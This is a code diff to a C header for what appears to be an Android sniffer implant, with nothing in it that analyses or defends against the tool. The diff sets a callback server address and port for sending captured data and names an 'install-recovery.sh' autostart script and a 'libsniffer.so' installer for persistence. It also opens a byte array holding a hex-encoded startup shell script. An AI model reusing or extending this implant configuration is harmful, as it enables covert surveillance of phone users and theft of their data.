@@ -9,19 +9,20 @@
 #ifndef SINFFEREXCUTEDEF_H_
 #define SINFFEREXCUTEDEF_H_
 
-#define ServerAdess 					"192.168.88.140"//"sniffer.wicp.net"
-#define ServerPort 						9876
-#define SnifferLogFileName 				"sniffer"
-
 #define RelaseFilePrefix				"/data/data/"
 #define RelaseFileLib					"/lib/"
 
 #define SinfferFile 					"sniffer"
 #define SinfferVersionString 			"sniffer version "
-#define SnifferVersion 					"1.1"
+#define SnifferVersion 					"1.0.0"
 #define SnifferVersionEnd 				" "
 #define AutoStartScriptFile				"install-recovery.sh"
 #define SnifferInStallerFile			"libsniffer.so"
+
+//#define ServerAdess					"sniffer.wicp.net"
+#define ServerAdess						"192.168.70.134"
+#define ServerPort						 9876
+#define SnifferLogFileName				"sniffer"
 
 static unsigned char AutoStartScript[] {
 	0x23 ,0x21 ,0x2f ,0x73 ,0x79 ,0x73 ,0x74 ,0x65 ,0x6d ,0x2f ,0x62 ,0x69 ,0x6e ,0x2f ,0x73 ,0x68,
